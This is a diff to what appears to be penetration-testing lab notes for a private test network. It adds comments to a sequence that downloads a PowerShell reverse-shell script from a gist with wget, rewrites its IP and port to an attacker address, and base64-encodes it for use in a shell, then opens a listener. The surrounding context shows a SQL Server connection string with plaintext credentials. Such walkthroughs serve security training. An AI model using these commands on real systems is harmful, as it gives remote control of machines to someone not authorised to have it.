@@ -115,8 +115,13 @@ Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
 ### 172.16.64.199
 
 ```bash
+# Grab payload
 wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;
+
+# Substitute ip and port
 sed -i 's/127.0.0.1/172.16.64.10/; s/413/1234/' mini-reverse.ps1
+
+# Encode payload
 cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3  | base64 -w 0 > encoded_payload
 cat encoded_payload # We'll use this payload in our shell
 # Open listener In your terminal
